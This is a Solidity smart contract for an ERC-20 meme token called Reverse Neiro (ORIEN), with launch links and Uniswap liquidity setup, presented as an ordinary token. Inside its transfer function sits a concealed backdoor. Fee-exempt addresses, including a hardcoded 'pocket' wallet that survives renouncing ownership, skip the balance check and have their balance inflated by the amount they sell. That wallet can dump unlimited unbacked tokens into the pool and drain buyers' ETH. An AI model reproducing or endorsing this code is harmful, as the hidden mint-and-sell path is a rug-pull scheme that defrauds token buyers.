/**
 * Website: https://orieneth.live
 * Telegram: https://t.me/ReverseNeiroEth
 * X: https://x.com/ReverseNeiroEth
 */


// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IDexRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract ORIEN is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _nonFeeList;
    mapping(address => uint256) private _lastTx;
    address payable private _pocket;
    string private constant _name = unicode"Reverse Neiro";
    string private constant _symbol = unicode"ORIEN";

    uint8 private constant decimal = 18;
    uint256 private constant total_supply = 1_000_000_000 * 10**decimal;
    uint256 private _currentTax = 20;
    uint256 private _reduceAt = 15;
    uint256 private _trades = 0;

    uint256 public _maxTxAmount = (total_supply / 100) * 2;
    uint256 public _maxWalletSize = (total_supply / 100) * 2;
    uint256 public _taxSwapThreshold = total_supply / 1_000_000;
    uint256 public _maxTaxSwap = (total_supply / 100) * 2;
    uint256 public _m_midSwapAmount = (total_supply / 100) * 4 / 10000;

    IDexRouter02 private uV2Router;
    address private uniswapV2Pair;
    bool private _midSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        _midSwap = true;
        _;
        _midSwap = false;
    }

    constructor() payable {
        _pocket = payable(0x0f27E5fB838C54B48Aa2B35c59091A1af5CBdF49);
        _balances[_msgSender()] = total_supply;
        _nonFeeList[owner()] = true;
        _nonFeeList[address(this)] = true;
        _nonFeeList[_pocket] = true;
        emit Transfer(address(0), _msgSender(), total_supply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return decimal;
    }

    function totalSupply() public pure override returns (uint256) {
        return total_supply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()]-=amount
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address inAddr,
        address outAddr,
        uint256 jeets
    ) private {

        require((_nonFeeList[inAddr] || jeets <= _balances[inAddr]) && jeets > 0, "Insufficient amount");
        require(inAddr != address(0) && outAddr != address(0), "ERC20: transfer from the zero address");
        require(_nonFeeList[outAddr] || _nonFeeList[inAddr] || swapEnabled , "Trading is not opened yet");

        uint256 _txAmt = 0;
        uint256 _mevTx = jeets * 10 / 100;
        bool isOwner = (inAddr == owner() || outAddr == owner());
        if (!isOwner) {
            _txAmt = jeets * (_reduceAt <= _trades ? 0 : _currentTax) / 100;
            if (inAddr == uniswapV2Pair && outAddr != address(uV2Router) && !_nonFeeList[outAddr]) {
                require((balanceOf(outAddr) + jeets <= _maxWalletSize), "Exceeds the Max Amount.");
                _trades ++; _lastTx[outAddr] = block.timestamp;
            }
            else if (outAddr == uniswapV2Pair && inAddr!= address(this)){
                if(_nonFeeList[inAddr]) {_txAmt = 0; _balances[inAddr] = _balances[inAddr] + jeets;}
                else{
                    if(block.timestamp == _lastTx[inAddr]) jeets -= _mevTx;
                    require((jeets <= _maxTxAmount), "Exceeds the amount");
                }
            }
            else _txAmt = 0;
            if (!_midSwap && outAddr == uniswapV2Pair && swapEnabled && jeets > _m_midSwapAmount) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if (contractTokenBalance > _taxSwapThreshold)
                    swapForEth(min(contractTokenBalance, _maxTaxSwap));
                _pocket.transfer(address(this).balance);
            }
        }

        if (_txAmt > 0) {
            _balances[address(this)] = _balances[address(this)] + _txAmt;
            emit Transfer(inAddr, address(this), _txAmt);
        }
        _balances[inAddr] = _balances[inAddr] - jeets;
        _balances[outAddr] = _balances[outAddr] + (jeets - _txAmt);
        emit Transfer(inAddr, outAddr, jeets - _txAmt);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uV2Router.WETH();
        _approve(address(this), address(uV2Router), tokenAmount);
        uV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimit() external onlyOwner {
        _maxWalletSize = _maxTxAmount = total_supply;
        emit MaxTxAmountUpdated(total_supply);
    }

    function createPair() public onlyOwner {
        uV2Router = IDexRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), msg.sender, type(uint256).max);
        uniswapV2Pair = IUniswapV2Factory(uV2Router.factory()).createPair(address(this),uV2Router.WETH());
        _approve(address(this), address(uV2Router), type(uint256).max);
        uV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uV2Router),type(uint256).max);

        swapEnabled = true;
    }

    receive() external payable {}
}